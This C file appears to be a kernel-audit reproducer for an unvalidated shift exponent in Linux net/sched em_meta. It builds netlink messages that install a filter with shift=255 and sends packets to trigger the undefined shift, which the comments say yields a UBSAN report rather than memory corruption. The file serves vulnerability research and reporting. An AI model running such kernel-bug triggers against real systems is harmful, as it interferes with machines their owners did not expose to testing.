/* Candidate C8: net/sched em_meta unvalidated shift exponent.
 *
 * net/sched/em_meta.c:762-767
 *
 *      static void meta_int_apply_extras(struct meta_value *v,
 *                                        struct meta_obj *dst)
 *      {
 *              if (v->hdr.shift)
 *                      dst->value >>= v->hdr.shift;   / * unsigned long * /
 *
 * v->hdr is a verbatim copy of the user-supplied struct tcf_meta_val
 * { __u16 kind; __u8 shift; __u8 op; }, so shift is 0..255.
 *
 * em_meta_change() validates only that TCF_META_TYPE(kind) and
 * TCF_META_ID(kind) are in range and that the id has a ->get; `shift` and `op`
 * are never bounded, here or anywhere else. The sibling meta_var_apply_extras()
 * IS guarded (shift < dst->len), which is what let this asymmetry survive.
 *
 * Shifting an unsigned long by >= 64 is undefined behaviour. On x86 the CPU
 * masks the count to 63, so there is NO memory corruption -- this is a UBSAN
 * finding, not an OOB. Reported and tested as such.
 *
 * Needs CONFIG_NET_EMATCH_META (to reach it) and CONFIG_UBSAN_SHIFT (to see
 * it); neither is in the usual defconfig-derived audit kernel.
 */
#include "common.h"
#include <netinet/in.h>

#define TCF_EM_META        4
#define TCA_EMATCH_TREE_HDR  1
#define TCA_EMATCH_TREE_LIST 2
#define TCA_BASIC_CLASSID    1
#define TCA_BASIC_EMATCHES   2
#define TCA_EM_META_HDR      1

#define TCF_META_TYPE_INT    1
#define TCF_META_ID_PKTLEN   9
#define TCF_META_ID_VALUE    0
#define META_KIND(type, id)  (((type) << 12) | (id))

struct tcf_ematch_tree_hdr_ { unsigned short nmatches, progid; };
struct tcf_ematch_hdr_ { unsigned short matchid, kind, flags, pad; };
struct tcf_meta_val_ { unsigned short kind; unsigned char shift, op; };
struct tcf_meta_hdr_ { struct tcf_meta_val_ left, right; };

static int nl, ifi;

static int add_prio_qdisc(void)
{
	struct nlbuf b;
	struct tcmsg tcm;

	memset(&tcm, 0, sizeof(tcm));
	tcm.tcm_family = AF_UNSPEC;
	tcm.tcm_ifindex = ifi;
	tcm.tcm_handle = 0x00010000u;      /* 1: */
	tcm.tcm_parent = TC_H_ROOT;

	nlb_init(&b, RTM_NEWQDISC, NLM_F_CREATE | NLM_F_REPLACE);
	nlb_put_hdr(&b, &tcm, sizeof(tcm));
	nlb_put_str(&b, TCA_KIND, "prio");
	return nl_send(nl, &b);
}

/* cls_basic with a single em_meta ematch whose left operand carries shift=255 */
static int add_basic_filter_with_meta(unsigned char shift)
{
	struct nlbuf b;
	struct tcmsg tcm;
	struct rtattr *opts, *emat, *list;
	struct tcf_ematch_tree_hdr_ th = { 1, 0 };
	unsigned char ent[64];
	int n = 0;

	/* One ematch list entry: the fixed header, then the match's own
	 * netlink attributes (em_meta_change() nla_parse()s everything after
	 * struct tcf_ematch_hdr). */
	{
		struct tcf_ematch_hdr_ eh;
		struct tcf_meta_hdr_ mh;
		unsigned short ahdr[2];

		memset(&eh, 0, sizeof(eh));
		eh.kind = TCF_EM_META;
		eh.flags = 0;                       /* TCF_EM_REL_END */
		memcpy(ent + n, &eh, sizeof(eh)); n += sizeof(eh);

		ahdr[0] = 4 + sizeof(mh);           /* nla_len */
		ahdr[1] = TCA_EM_META_HDR;          /* nla_type */
		memcpy(ent + n, ahdr, 4); n += 4;

		memset(&mh, 0, sizeof(mh));
		/* left: packet length, an INT metadatum that always resolves,
		 * carrying the out-of-range shift. */
		mh.left.kind  = META_KIND(TCF_META_TYPE_INT, TCF_META_ID_PKTLEN);
		mh.left.shift = shift;
		mh.left.op    = 0;                  /* TCF_EM_OPND_EQ */
		/* right: a constant; same TYPE is required by em_meta_change */
		mh.right.kind = META_KIND(TCF_META_TYPE_INT, TCF_META_ID_VALUE);
		memcpy(ent + n, &mh, sizeof(mh)); n += sizeof(mh);
	}

	memset(&tcm, 0, sizeof(tcm));
	tcm.tcm_family = AF_UNSPEC;
	tcm.tcm_ifindex = ifi;
	tcm.tcm_parent = 0x00010000u;                    /* 1: */
	tcm.tcm_info = (1u << 16) | htons(0x0003);       /* prio 1, ETH_P_ALL */

	nlb_init(&b, RTM_NEWTFILTER, NLM_F_CREATE | NLM_F_REPLACE);
	nlb_put_hdr(&b, &tcm, sizeof(tcm));
	nlb_put_str(&b, TCA_KIND, "basic");
	opts = nlb_nest_start(&b, TCA_OPTIONS);
	nlb_put_u32(&b, TCA_BASIC_CLASSID, 0x00010001u); /* 1:1 */
	emat = nlb_nest_start(&b, TCA_BASIC_EMATCHES);
	nlb_put_attr(&b, TCA_EMATCH_TREE_HDR, &th, sizeof(th));
	list = nlb_nest_start(&b, TCA_EMATCH_TREE_LIST);
	nlb_put_attr(&b, 1, ent, n);
	nlb_nest_end(&b, list);
	nlb_nest_end(&b, emat);
	nlb_nest_end(&b, opts);

	return nl_send(nl, &b);
}

/* Any transmit through the prio qdisc runs the filter chain, which evaluates
 * the ematch and therefore the shift. dummy0 discards the frame afterwards. */
static void drive_traffic(void)
{
	struct sockaddr_in to;
	int s = socket(AF_INET, SOCK_DGRAM, 0);
	char buf[64] = "x";
	int i;

	if (s < 0) { logf("socket(UDP) failed: %s", strerror(errno)); return; }
	memset(&to, 0, sizeof(to));
	to.sin_family = AF_INET;
	to.sin_port = htons(1234);
	to.sin_addr.s_addr = htonl(0x0a090902u);   /* 10.9.9.2, via dummy0 */

	for (i = 0; i < 8; i++)
		sendto(s, buf, sizeof(buf), 0, (struct sockaddr *)&to, sizeof(to));
	close(s);
	logf("sent 8 packets through the prio qdisc");
}

int main(void)
{
	int rc;

	logf("=== net/sched em_meta unvalidated shift exponent (C8) ===");
	enter_userns();

	nl = nl_open();
	{ int lo = if_index("lo"); if (lo > 0) link_up(nl, lo); }

	ifi = create_dummy(nl, "d0");
	if (ifi < 0)
		die("create dummy d0");
	if (addr_add4(nl, ifi, "10.9.9.1", 24) != 0)
		logf("WARN: addr_add4 failed");
	link_up(nl, ifi);
	logf("d0 up, ifindex=%d", ifi);

	rc = add_prio_qdisc();
	logf("RTM_NEWQDISC prio -> %d (%s)", rc, rc ? strerror(-rc) : "ok");
	if (rc)
		goto done;

	/* shift = 255 is far past the 63 that an unsigned long allows */
	rc = add_basic_filter_with_meta(255);
	logf("RTM_NEWTFILTER basic+em_meta(shift=255) -> %d (%s)",
	     rc, rc ? strerror(-rc) : "ok");
	if (rc) {
		logf("filter rejected: em_meta may not be built in "
		     "(CONFIG_NET_EMATCH_META)");
		goto done;
	}

	logf("driving traffic  <-- TRIGGER");
	drive_traffic();
	sleep(2);

done:
	logf("sequence complete");
	return 0;
}
